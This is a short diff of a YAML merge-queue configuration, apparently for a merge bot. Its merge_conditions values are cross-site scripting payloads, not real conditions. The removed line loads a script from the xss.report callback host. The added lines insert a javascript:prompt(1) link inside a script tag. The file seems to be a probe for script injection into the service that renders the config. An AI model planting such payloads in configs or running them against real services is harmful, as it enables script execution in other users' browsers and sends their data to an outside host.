@@ -25,4 +25,6 @@ queue_rules:
   - merge_conditions:
       - and:
           - ''
-          - '  "><script src=https://xss.report/c/e></script>'
+          - '  "><script src=https://[aee](javascript:prompt(1))
+></script>
+'
